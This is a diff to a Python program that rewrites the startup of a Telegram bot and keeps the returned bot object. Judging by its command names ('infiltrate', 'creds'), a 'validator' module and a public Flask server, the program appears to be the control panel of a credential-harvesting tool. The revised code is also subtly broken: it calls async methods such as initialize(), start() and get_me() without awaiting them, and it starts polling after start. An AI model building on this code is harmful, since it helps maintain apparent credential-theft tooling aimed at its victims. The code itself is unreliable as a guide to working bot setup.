@@ -1172,29 +1172,42 @@ async def help_command(update: Update, context: CallbackContext):
     )
     await update.message.reply_text(help_text)
 
-# Initialize the bot
+# Replace the entire bot initialization section at the bottom with this:
+
 def init_telegram_bot():
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # Add command handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("infiltrate", infiltrate_command))
-    application.add_handler(CommandHandler("status", status_command))
-    application.add_handler(CommandHandler("creds", creds_command))
-    application.add_handler(CommandHandler("help", help_command))
-    
-    # Add callback handler for inline buttons
-    application.add_handler(telegram.ext.CallbackQueryHandler(button_callback))
-    
-    # Start the bot in a separate thread
-    def run_bot():
-        application.run_polling()
-    
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
-    
-    return application
+    try:
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        # Add command handlers
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("infiltrate", infiltrate_command))
+        application.add_handler(CommandHandler("status", status_command))
+        application.add_handler(CommandHandler("creds", creds_command))
+        application.add_handler(CommandHandler("help", help_command))
+        
+        # Add callback handler for inline buttons
+        application.add_handler(telegram.ext.CallbackQueryHandler(button_callback))
+        
+        # Initialize the bot
+        application.initialize()
+        application.start()
+        
+        # Start bot in a background thread
+        def run_bot():
+            application.run_polling()
+        
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+        
+        # Test connection
+        bot = telegram.Bot(token=BOT_TOKEN)
+        bot_info = bot.get_me()
+        print(f"Bot connected: @{bot_info.username}")
+        
+        return application
+    except Exception as e:
+        print(f"Failed to initialize Telegram bot: {e}")
+        return None
 
 if __name__ == "__main__":
     # Initialize database
@@ -1204,7 +1217,7 @@ if __name__ == "__main__":
     doublerhit2.initialize_validator()
     
     # Initialize Telegram bot
-    init_telegram_bot()
+    bot_app = init_telegram_bot()
     
     # Start Flask app
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
